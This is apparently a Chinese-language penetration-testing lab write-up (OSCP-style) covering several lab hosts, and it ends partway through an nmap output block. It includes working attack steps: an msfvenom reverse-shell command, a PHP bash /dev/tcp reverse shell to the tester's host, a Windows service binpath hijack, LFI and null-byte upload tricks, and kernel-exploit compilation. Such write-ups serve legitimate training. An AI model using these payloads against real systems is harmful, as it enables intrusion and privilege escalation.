<p><a href="https://www.absolomb.com/2017-12-29-HackTheBox-Arctic-Writeup/" target="_blank" rel="noopener">https://www.absolomb.com/2017-12-29-HackTheBox-Arctic-Writeup/</a></p>
<p>這個連結進行後門的上傳與 nc </p>
<p><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.11.0.42 LPORT=443 -f raw &gt; shell.jsp</code></p>
<p><img src="https://i.imgur.com/PXAIBCY.png" alt=""></p>
<p><img src="https://i.imgur.com/kLqytT8.png" alt=""></p>
<p><img src="https://i.imgur.com/dn4rYi2.png" alt=""></p>
<h2 id="10-11-1-13"><a href="#10-11-1-13" class="headerlink" title="10.11.1.13"></a>10.11.1.13</h2><p>他沒辦法 nmap 被我盲摸到 80 port 有開</p>
<p>看了下是 IIS</p>
<p>並且有開 WebDAV</p>
<p><img src="https://i.imgur.com/eeFFeeh.png" alt=""></p>
<p>之後輾轉找到了 WebDAV 的 client工具 <code>cadaver</code></p>
<p><img src="https://i.imgur.com/YvWayqG.png" alt=""></p>
<p>測試後發現他擋了 exe 和 asp 的上傳</p>
<p>那我們直接 put 一個 txt 或其他ok的副檔名上去再改名就好了</p>
<p>然後直接 GET <a href="http://10.11.1.13/shell.asp" target="_blank" rel="noopener">http://10.11.1.13/shell.asp</a></p>
<p>就聽到了</p>
<p><img src="https://i.imgur.com/OUznyzU.png" alt=""></p>
<p>由於 windows XP SP2之前都沒有 whoami 這個指令</p>
<p>echo %username% 也沒用</p>
<p>所以我是用 <code>net user</code> 一個一個看</p>
<p><img src="https://i.imgur.com/KU1r2eA.png" alt=""></p>
<p>最後看到這個，由於我們是用 IIS 進去的，所以可以假定我們的 user 就是 <code>IWAM_BOB</code></p>
<p>可以用sysinternal的工具 <code>AccessChk</code> 去確認服務</p>
<p>我在這邊卡一陣子，主要是他會 pop 一個新的 windows要你看接受才能繼續，但我們是用cmd叫的</p>
<p>想當然，這時候要抓舊版的 AccessChk 就有 <code>/accepteula</code> 這個 FLAG 可以用</p>
<p>ref: <a href="https://xor.cat/2017/09/05/sysinternals-accesschk-accepteula/" target="_blank" rel="noopener">https://xor.cat/2017/09/05/sysinternals-accesschk-accepteula/</a></p>
<p>然後這邊我又卡了</p>
<p><img src="https://i.imgur.com/3zcO6kp.png" alt=""></p>
<p>這樣不行，我看寫第一次才會跳新視窗，那我第一次先 <code>AccessChk /accepteula -h</code></p>
<p>後面再把 <code>/accepteula</code> 拿掉呢? 還是不行Q</p>
<p>會跳視窗卡死</p>
<p>要這樣才能…</p>
<p><img src="https://i.imgur.com/NzRlYLx.png" alt=""></p>
<p>順便看一下該服務的權限</p>
<p><img src="https://i.imgur.com/RnljJEl.png" alt=""></p>
<p>再來就照 <a href="https://www.fuzzysecurity.com/tutorials/16.html" target="_blank" rel="noopener">https://www.fuzzysecurity.com/tutorials/16.html</a> </p>
<p>一個一個看</p>
<p><img src="https://i.imgur.com/63GvSbU.png" alt=""></p>
<p>(記住空格有差)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Inetpub\wwwroot&gt;sc config SSDPSRV binpath= &quot;C:\Inetpub\wwwroot\shell.exe&quot;</span><br><span class="line">sc config SSDPSRV binpath= &quot;C:\Inetpub\wwwroot\shell.exe&quot;</span><br><span class="line">[SC] ChangeServiceConfig SUCCESS</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Inetpub\wwwroot&gt; sc config SSDPSRV obj= &quot;.\LocalSystem&quot; password= &quot;&quot; </span><br><span class="line"> sc config SSDPSRV obj= &quot;.\LocalSystem&quot; password= &quot;&quot;</span><br><span class="line">[SC] ChangeServiceConfig SUCCESS</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">C:\Inetpub\wwwroot&gt;sc qc SSDPSRV</span><br><span class="line">sc qc SSDPSRV</span><br><span class="line">[SC] GetServiceConfig SUCCESS</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: SSDPSRV</span><br><span class="line">        TYPE               : 20  WIN32_SHARE_PROCESS </span><br><span class="line">        START_TYPE         : 4   DISABLED</span><br><span class="line">        ERROR_CONTROL      : 1   NORMAL</span><br><span class="line">        BINARY_PATH_NAME   : C:\Inetpub\wwwroot\shell.exe  </span><br><span class="line">        LOAD_ORDER_GROUP   :   </span><br><span class="line">        TAG                : 0  </span><br><span class="line">        DISPLAY_NAME       : SSDP Discovery Service  </span><br><span class="line">        DEPENDENCIES       :   </span><br><span class="line">        SERVICE_START_NAME : LocalSystem  </span><br><span class="line"></span><br><span class="line">C:\Inetpub\wwwroot&gt;</span><br></pre></td></tr></table></figure>
<p>開啟服務:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Inetpub\wwwroot&gt;sc config SSDPSRV start= &quot;demand&quot;</span><br><span class="line">sc config SSDPSRV start= &quot;demand&quot;</span><br><span class="line">[SC] ChangeServiceConfig SUCCESS</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">C:\Inetpub\wwwroot&gt;sc qc SSDPSRV</span><br><span class="line">sc qc SSDPSRV</span><br><span class="line">[SC] GetServiceConfig SUCCESS</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: SSDPSRV</span><br><span class="line">        TYPE               : 20  WIN32_SHARE_PROCESS </span><br><span class="line">        START_TYPE         : 3   DEMAND_START</span><br><span class="line">        ERROR_CONTROL      : 1   NORMAL</span><br><span class="line">        BINARY_PATH_NAME   : C:\Inetpub\wwwroot\shell.exe  </span><br><span class="line">        LOAD_ORDER_GROUP   :   </span><br><span class="line">        TAG                : 0  </span><br><span class="line">        DISPLAY_NAME       : SSDP Discovery Service  </span><br><span class="line">        DEPENDENCIES       :   </span><br><span class="line">        SERVICE_START_NAME : LocalSystem</span><br></pre></td></tr></table></figure>
<p>開啟網路服務</p>
<p>net SSDPSRV start </p>
<p><img src="https://i.imgur.com/yChzpjg.png" alt=""></p>
<p><img src="https://i.imgur.com/Q84bQaW.png" alt=""></p>
<p><img src="https://i.imgur.com/WWI1tSP.png" alt=""></p>
<p>真的學到不少</p>
<h2 id="10-11-1-14"><a href="#10-11-1-14" class="headerlink" title="10.11.1.14"></a>10.11.1.14</h2><p>the same as 13</p>
<p>不過這次換一個服務重頭打一次</p>
<p>得知了一些事</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">C:\Inetpub\wwwroot&gt;sc qc upnphost</span><br><span class="line">sc qc upnphost</span><br><span class="line">[SC] GetServiceConfig SUCCESS</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: upnphost</span><br><span class="line">        TYPE               : 20  WIN32_SHARE_PROCESS </span><br><span class="line">        START_TYPE         : 3   DEMAND_START</span><br><span class="line">        ERROR_CONTROL      : 1   NORMAL</span><br><span class="line">        BINARY_PATH_NAME   : &apos;C:\Inetpub\wwwroot\shell.exe&apos;  </span><br><span class="line">        LOAD_ORDER_GROUP   :   </span><br><span class="line">        TAG                : 0  </span><br><span class="line">        DISPLAY_NAME       : Universal Plug and Play Device Host  </span><br><span class="line">        DEPENDENCIES       : SSDPSRV  </span><br><span class="line">        SERVICE_START_NAME : LocalSystem</span><br></pre></td></tr></table></figure>
<p>因為 <code>upnphost</code> 是依靠 <code>SSDPSRV</code> 的，所以SSDPSRV如果沒開啟他也無法開啟</p>
<p>且如果 <code>SSDPSRV</code> 沒有設定為 ROOT 那依賴他的<code>upnphost</code>傳回來的SHELL也不會有ROOT權限</p>
<p>那不如一開始就直接讓<code>SSDPSRV</code>有ROOT權限，把SHELL傳回來就好了XDD</p>
<h2 id="10-11-1-22"><a href="#10-11-1-22" class="headerlink" title="10.11.1.22"></a>10.11.1.22</h2><p>這一題在 nmap 掃完前就打玩了…</p>
<p>確認過 80 443 都有開</p>
<p><img src="https://i.imgur.com/5tLvKuO.png" alt=""></p>
<p><img src="https://i.imgur.com/vu9ecO4.png" alt=""></p>
<p>gobuster 感覺沒啥有趣的東西</p>
<p>但有些path會轉到 127.0.0.1 因此這部分我懷疑可能要先拿 shell 後再 curl 127.0.0.1 才看的到資訊(先保留)</p>
<p>curl -I 看 header</p>
<p><img src="https://i.imgur.com/WZMDzui.png" alt=""></p>
<p>一開始看到 DAV 就去嘗試，光試第一個就405 我就沒再往下試了</p>
<p>看到 mod_ssl就想到之前好像有一個很有名的洞是 mod_ssl 的</p>
<p>果然找到了</p>
<p><a href="https://github.com/gazcbm/openfuck-2017" target="_blank" rel="noopener">https://github.com/gazcbm/openfuck-2017</a></p>
<p>拿來一試就成功，但shell怪怪的</p>
<p><img src="https://i.imgur.com/7s9wO4t.png" alt=""></p>
<p>LinEnum.sh跑過沒啥東西</p>
<p>uname 確認版本號後有一個CVE可以用</p>
<p><code>Linux barry 2.4.18-3 #1 Thu Apr 18 07:37:53 EDT 2002 i686 unknown</code></p>
<p><a href="https://www.exploit-db.com/exploits/3" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/3</a></p>
<p>確認過還好有gcc…不用再裝一個red hat來搞</p>
<p>但 gcc 會噴找不到 ld</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">readline: warning: rl_prep_terminal: cannot get terminal settingsapache-2.05a$ gcc 3.c</span><br><span class="line">collect2: cannot find `ld&apos;</span><br></pre></td></tr></table></figure>
<p>但我 ld 明明 whereis 的到r</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">readline: warning: rl_prep_terminal: cannot get terminal settingsapache-2.05a$ whereis ld</span><br><span class="line">ld: /usr/bin/ld /usr/share/man/man1/ld.1.gz</span><br></pre></td></tr></table></figure>
<p>我猜是環境變數噴了，所以找如何指定 ld 的 path</p>
<p>找到後成功</p>
<p><img src="https://i.imgur.com/WVJ75bZ.png" alt=""></p>
<p><img src="https://i.imgur.com/pNvbw0G.png" alt=""></p>
<p><img src="https://i.imgur.com/IwlRCDf.png" alt=""></p>
<h2 id="10-11-1-24"><a href="#10-11-1-24" class="headerlink" title="10.11.1.24"></a>10.11.1.24</h2><p>這題還蠻難的</p>
<p>一樣有開 web</p>
<p><img src="https://i.imgur.com/XEK8ntK.png" alt=""></p>
<p>登入 admin/admin就進去了</p>
<p>當初在這邊卡了一陣子</p>
<p>因為 CS-Cart 有一個LFI的洞可以試</p>
<p><a href="https://www.exploit-db.com/exploits/1872" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/1872</a></p>
<p><a href="http://10.11.1.24//classes/phpmailer/class.cs_phpmailer.php?classes_dir=/etc/passwd%00" target="_blank" rel="noopener">http://10.11.1.24//classes/phpmailer/class.cs_phpmailer.php?classes_dir=/etc/passwd%00</a></p>
<p><img src="https://i.imgur.com/ukqXbi9.png" alt=""></p>
<p>知道了 LFI 可以用之後，我下一步會看哪裡有上傳點 (RFI 測試失敗了)</p>
<p><img src="https://i.imgur.com/z5BxTvo.png" alt=""></p>
<p>最後逛到 fckeditor! 他最著名的就是可以任意上傳</p>
<p><img src="https://i.imgur.com/BjPZGMF.png" alt=""></p>
<p>exploitdb看到這個<br><a href="https://www.exploit-db.com/exploits/17644" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/17644</a></p>
<p><img src="https://i.imgur.com/rMNsKhv.png" alt=""></p>
<p>對照目標的 <code>test.html</code></p>
<p><img src="https://i.imgur.com/KwBcJ0Z.png" alt=""></p>
<p>但 php 無法上傳</p>
<p><img src="https://i.imgur.com/cINhTD8.png" alt=""></p>
<p>最後是看這個<br><a href="https://secureyes.net/brochures/File-Upload-Vulnerability-in-FCKEditor.pdf" target="_blank" rel="noopener">https://secureyes.net/brochures/File-Upload-Vulnerability-in-FCKEditor.pdf</a></p>
<p>利用 <code>%00</code>進行截斷上傳</p>
<p><img src="https://i.imgur.com/Vm4V8VC.png" alt=""></p>
<p><img src="https://i.imgur.com/RUmpp45.png" alt=""></p>
<p><img src="https://i.imgur.com/GbieuQk.png" alt=""></p>
<p>到這裡我們拿到低權 shell</p>
<p><img src="https://i.imgur.com/OFVgNGp.png" alt=""></p>
<p>exploitdb:</p>
<p><a href="https://www.exploit-db.com/exploits/40839" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/40839</a></p>
<p>因為是 debian base 的，所以可以直接用kali編完丟上去</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Not Found</span><br><span class="line"></span><br><span class="line">The requested URL /robots.txt was not found on this server.</span><br><span class="line">Apache/2.2.4 (Ubuntu) PHP/5.2.3-1ubuntu6 Server at 10.11.1.24 Port 80</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ uname -a</span><br><span class="line">Linux payday 2.6.22-14-server #1 SMP Sun Oct 14 23:34:23 GMT 2007 i686 GNU/Linux</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/oscp/10.11.1.24# gcc  -m32 -pthread 40839.c -o dirty -lcrypt</span><br><span class="line">root@kali:~/oscp/10.11.1.24#</span><br></pre></td></tr></table></figure>
<p>最後我用 <code>-m32</code> 沒加 <code>-static</code> 才成功<br><img src="https://i.imgur.com/vuD1frv.png" alt=""></p>
<p>這邊我們用toor當密碼，而後他就卡住了</p>
<p>重新連回來就看到我們的帳戶了</p>
<p><img src="https://i.imgur.com/jeq4lO2.png" alt=""></p>
<h2 id="10-11-1-31"><a href="#10-11-1-31" class="headerlink" title="10.11.1.31 (*)"></a>10.11.1.31 (*)</h2><p><a href="https://www.adampalmer.me/iodigitalsec/2013/08/10/accessing-and-hacking-mssql-from-backtrack-linux/" target="_blank" rel="noopener">https://www.adampalmer.me/iodigitalsec/2013/08/10/accessing-and-hacking-mssql-from-backtrack-linux/</a></p>
<p>nmap:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 10.11.1.31</span><br><span class="line">Host is up (0.39s latency).</span><br><span class="line">Not shown: 65528 closed ports</span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">80/tcp   open  http          Microsoft IIS httpd 6.0</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   /: </span><br><span class="line">|     ASPSESSIONIDAAARCCCD: </span><br><span class="line">|_      httponly flag not set</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Microsoft-IIS/6.0</span><br><span class="line">|_http-title: Login</span><br><span class="line">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp  open  microsoft-ds  Windows Server 2003 3790 Service Pack 1 microsoft-ds</span><br><span class="line">1025/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">1433/tcp open  ms-sql-s      Microsoft SQL Server 2000 8.00.766.00; SP3a</span><br><span class="line">| ms-sql-ntlm-info: </span><br><span class="line">|_  Product_Version: 5.2.3790</span><br><span class="line">3389/tcp open  ms-wbt-server Microsoft Terminal Service</span><br><span class="line">MAC Address: 00:50:56:B8:37:FA (VMware)</span><br><span class="line">Device type: general purpose|media device|specialized</span><br><span class="line">Running (JUST GUESSING): Microsoft Windows 2003|XP|PocketPC/CE|2000 (95%), Motorola embedded (89%), Beat embedded (87%), Microsoft embedded (85%)</span><br><span class="line">OS CPE: cpe:/o:microsoft:windows_server_2003::sp2 cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_ce:5.0 cpe:/h:motorola:vip1216 cpe:/o:microsoft:windows_ce:6.0 cpe:/o:microsoft:windows_2000::sp4:server</span><br><span class="line">Aggressive OS guesses: Microsoft Windows Server 2003 SP2 (95%), Microsoft Windows XP SP3 (93%), Microsoft Windows XP (93%), Microsoft Windows Server 2003 (92%), Microsoft Windows Server 2003 SP0 - SP2 (91%), Microsoft Windows Server 2003 SP1 or SP2 (91%), Microsoft Windows Server 2003 SP1 (90%), Microsoft Windows 2003 (90%), Microsoft Windows Server 2003 SP0 or Windows XP SP2 (90%), Microsoft Windows XP Professional SP3 (90%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2003</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 2h41m28s, deviation: 4h14m34s, median: -18m32s</span><br><span class="line">| ms-sql-info: </span><br><span class="line">|   Windows server name: RALPH</span><br><span class="line">|   10.11.1.31\MSSQLSERVER: </span><br><span class="line">|     Instance name: MSSQLSERVER</span><br><span class="line">|     Version: </span><br><span class="line">|       name: Microsoft SQL Server 2000 SP3a</span><br><span class="line">|       number: 8.00.766.00</span><br><span class="line">|       Product: Microsoft SQL Server 2000</span><br><span class="line">|       Service pack level: SP3a</span><br><span class="line">|       Post-SP patches applied: false</span><br><span class="line">|     TCP port: 1433</span><br><span class="line">|     Named pipe: \\10.11.1.31\pipe\sql\query</span><br><span class="line">|_    Clustered: false</span><br><span class="line">|_nbstat: NetBIOS name: RALPH, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:50:56:b8:37:fa (VMware)</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows Server 2003 3790 Service Pack 1 (Windows Server 2003 5.2)</span><br><span class="line">|   OS CPE: cpe:/o:microsoft:windows_server_2003::sp1</span><br><span class="line">|   Computer name: ralph</span><br><span class="line">|   NetBIOS computer name: RALPH\x00</span><br><span class="line">|   Workgroup: THINC\x00</span><br><span class="line">|_  System time: 2020-02-20T09:59:28-06:00</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">|_smb2-time: Protocol negotiation failed (SMB2)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 1724.53 seconds</span><br></pre></td></tr></table></figure>
<p>看到 windows 2003 + smb </p>
<p>第一時間就去看MS17-010</p>
<p><img src="https://i.imgur.com/eeRcoXU.png" alt=""></p>
<p>看起來的結果是好的</p>
<p>但問題在於沒有專門的 windows 2k3 的 exploit</p>
<p>必須拿裡面的 zzz_exploit.py來改</p>
<p>reverse shell:</p>
<p><img src="https://i.imgur.com/T9N4Z3b.png" alt=""></p>
<p>直接給改好的 POC:</p>
<p><img src="https://i.imgur.com/tUNtAxr.png" alt=""></p>
<p>參考作法:<br><a href="https://medium.com/@sdgeek/hack-the-box-htb-blue-115b3f563125" target="_blank" rel="noopener">https://medium.com/@sdgeek/hack-the-box-htb-blue-115b3f563125</a></p>
<p>過程:</p>
<p><img src="https://i.imgur.com/FDQQHAm.png" alt=""></p>
<p><img src="https://i.imgur.com/2K43uM9.png" alt=""></p>
<p><img src="https://i.imgur.com/nrWnut7.png" alt=""></p>
<h2 id="10-11-1-35"><a href="#10-11-1-35" class="headerlink" title="10.11.1.35 (*)"></a>10.11.1.35 (*)</h2><p>nmap<br><img src="https://i.imgur.com/Mmi5F1l.png" alt=""><br>一臉就是打web<br>WEB<br><img src="https://i.imgur.com/iODf1DM.png" alt=""></p>
<p><img src="https://i.imgur.com/yN4z6tj.png" alt=""></p>
<p>嘗試LFI:<br><img src="https://i.imgur.com/9OTzpbX.png" alt=""></p>
<p>嘗試RFI:<br><img src="https://i.imgur.com/HVcsubF.png" alt=""></p>
<p>雖然讀phpinfo成功了，但一句話失敗了</p>
<p>最後發現用 <code>shell_exec</code> 可以成功，用 <code>system</code>就失敗</p>
<p>所以改了下 reverse shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/oscp/10.11.1.35# cat shell.php </span><br><span class="line">&lt;?php echo shell_exec(&quot;bash -i &gt;&amp; /dev/tcp/10.11.0.42/443 0&gt;&amp;1&quot;);?&gt;</span><br></pre></td></tr></table></figure></p>
<p>透過RFI就拿到shell了</p>
<p>uname:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash-3.1$ uname -a</span><br><span class="line">Linux pain 2.6.18-274.3.1.el5 #1 SMP Tue Sep 6 20:14:03 EDT 2011 i686 i686 i386 GNU/Linux</span><br></pre></td></tr></table></figure></p>
<p>最後解出來了，可以透過cp提權</p>
<p><code>cp /etc/shadow /dev/stdout</code><br>可以顯示出 shadow 的內容，代表可以任意讀寫<br>因此產生一個 <code>root::0</code> 的 passwd<br>用cp覆蓋過去再 <code>su root</code> 就好了</p>
<h2 id="10-11-1-39"><a href="#10-11-1-39" class="headerlink" title="10.11.1.39"></a>10.11.1.39</h2><p>nmap:<br><img src="https://i.imgur.com/QxuocFx.png" alt=""><br>看到80 port 有開<br>gobuster:<br><img src="https://i.imgur.com/5guRbcI.png" alt=""><br>robots.txt:<br><img src="https://i.imgur.com/Z2UPav3.png" alt=""></p>
<p><img src="https://i.imgur.com/jjzzFjR.png" alt=""></p>
<p>上面說我們不是 搜尋引擎所以不給我們看 robots.txt<br>那就…變成搜尋引擎吧<br><a href="https://perishablepress.com/list-all-user-agents-top-search-engines/" target="_blank" rel="noopener">https://perishablepress.com/list-all-user-agents-top-search-engines/</a></p>
<p><img src="https://i.imgur.com/LzohoJm.png" alt=""></p>
<p>進這個畫面後是一個 otrs 的登入畫面</p>
<p><img src="https://i.imgur.com/rNmf7k1.png" alt=""></p>
<p><a href="https://www.cleancss.com/router-default/" target="_blank" rel="noopener">https://www.cleancss.com/router-default/</a><br>原本找了這個網站想試預設帳號密碼，結果失敗</p>
<p>帳號密碼經友人通靈出來是 <code>root@localhost/otrs</code></p>
<p>otrs 5 查了下有漏洞<br><a href="https://www.exploit-db.com/exploits/43853" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/43853</a></p>
<p>照著設定大概是這樣</p>
<p><img src="https://i.imgur.com/8TbTcPz.png" alt=""></p>
<p>update 之後再進去一次 <a href="http://10.11.1.39/index.pl?Action=AdminPGP" target="_blank" rel="noopener">http://10.11.1.39/index.pl?Action=AdminPGP</a></p>
<p>就拿到shell了</p>
<p><img src="https://i.imgur.com/wyjVIlc.png" alt=""></p>
<p>進去後稍微整理一下 shell <code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p>
<p>跑了 LinEnum.sh之後看到一個很 WTF 的東西<br><img src="https://i.imgur.com/xIGnLZf.png" alt=""></p>
<p><code>passwd</code> 777!?</p>
<p>對 所以我們只要下個command再su就拿到root了</p>
<p><img src="https://i.imgur.com/yIIEDiL.png" alt=""></p>
<h2 id="10-11-1-49"><a href="#10-11-1-49" class="headerlink" title="10.11.1.49"></a>10.11.1.49</h2><p>the same as .50</p>
<p><img src="https://i.imgur.com/OguAmlN.png" alt=""></p>
<h2 id="10-11-1-50"><a href="#10-11-1-50" class="headerlink" title="10.11.1.50"></a>10.11.1.50</h2><p>畫面</p>
<p><img src="https://i.imgur.com/bvCHDML.png" alt=""></p>
<p>一開始很開心的try CVE-2018-7600</p>
<p>結果失敗 於是只好乖乖 nmap</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span 